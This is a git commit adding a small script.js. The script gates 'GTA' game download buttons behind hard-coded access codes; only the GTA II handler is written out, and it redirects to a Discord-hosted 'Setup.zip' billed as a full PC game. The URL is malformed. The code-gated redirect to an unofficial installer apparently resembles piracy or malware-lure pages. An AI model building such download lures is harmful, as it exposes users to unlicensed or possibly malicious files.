463bcd5f3b20929b56f2bef90e037ccc026d2337
Technicalearth <74358289+Technicalearth@users.noreply.github.com>
2022-05-07 17:57:47 +0530

    Add files via upload

---
+++ script.js
@@ -0,0 +1,19 @@
+let codeII = document.getElementById("GTAII-code")
+let codeIII = document.getElementById("GTAIII-code")
+let codeVC = document.getElementById("GTAVC-code")
+let codeSA = document.getElementById("GTASA-code")
+let codeIV = document.getElementById("GTAIV-code")
+let codeV = document.getElementById("GTAV-code")
+
+let dnGTAII = document.getElementById("dn-gta-2")
+let dnGTAIII = document.getElementById("dn-gta-3")
+let dnGTAVC = document.getElementById("dn-gta-VC")
+let dnGTASA = document.getElementById("dn-gta-SA")
+let dnGTAIV = document.getElementById("dn-gta-4")
+let dnGTAV = document.getElementById("dn-gta-5")
+
+dnGTAII.addEventListener("click", () => {
+    if(codeII.value == "kA0W2moi") {
+        window.location.href = "hhttps://cdn.discordapp.com/attachments/971594184983203922/971803533051572244/Setup.zip?file=Grand+Theft+Auto+2+Game+Download+For+PC+Full+Ve....zip"
+    }
+})
